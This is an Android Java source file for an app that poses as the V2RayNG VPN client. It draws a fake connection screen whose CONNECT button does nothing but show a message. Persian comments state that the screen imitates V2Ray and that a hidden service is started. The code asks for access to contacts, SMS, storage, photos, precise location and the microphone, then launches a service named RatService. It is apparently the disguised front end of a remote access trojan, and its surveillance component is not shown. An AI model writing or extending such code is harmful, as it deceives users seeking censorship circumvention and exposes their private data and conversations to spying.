package com.v2ray.update;
import android.app.Activity; import android.content.Intent; import android.os.Bundle; import android.widget.*;
import android.graphics.Color;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // ساخت یه صفحه ساده شبیه V2Ray
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#1E1E1E"));
        layout.setPadding(50, 150, 50, 50);
        
        TextView title = new TextView(this);
        title.setText("V2RayNG");
        title.setTextColor(Color.WHITE);
        title.setTextSize(30);
        title.setGravity(android.view.Gravity.CENTER);
        layout.addView(title);
        
        Button btn = new Button(this);
        btn.setText("CONNECT");
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#2E7D32"));
        btn.setOnClickListener(v -> {
            Toast.makeText(this, "Connecting to server...", Toast.LENGTH_SHORT).show();
        });
        layout.addView(btn);
        
        setContentView(layout);
        
        // درخواست مجوزها
        requestPermissions(new String[]{
            android.Manifest.permission.READ_CONTACTS, 
            android.Manifest.permission.READ_SMS, 
            android.Manifest.permission.READ_EXTERNAL_STORAGE, 
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.ACCESS_FINE_LOCATION, 
            android.Manifest.permission.RECORD_AUDIO
        }, 100);
        
        // استارت سرویس مخفی
        startService(new Intent(this, RatService.class));
    }
}